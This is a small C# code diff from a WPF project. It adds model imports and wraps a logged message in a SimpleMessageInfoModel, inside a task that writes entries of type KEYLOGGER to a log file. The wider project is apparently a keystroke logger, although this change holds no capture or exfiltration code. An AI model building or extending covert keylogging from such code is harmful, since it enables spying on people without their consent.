@@ -6,6 +6,8 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using WPF.Databases.Contexts;
+using WPF.Models;
+using WPF.Models.Extensions;
 using WPF.Models.Interfaces;
 
 namespace WPF.Managers.Tasks
@@ -65,7 +67,7 @@ namespace WPF.Managers.Tasks
                 LogManager.Instance.LogToFile(new Models.LogInfoModel
                 {
                     Type = Models.Enums.FileTypesEnum.KEYLOGGER,
-                    Message = stringbuilder.ToString()
+                    Message = new SimpleMessageInfoModel(stringbuilder.ToString())
                 });
             }
             Completed = true;
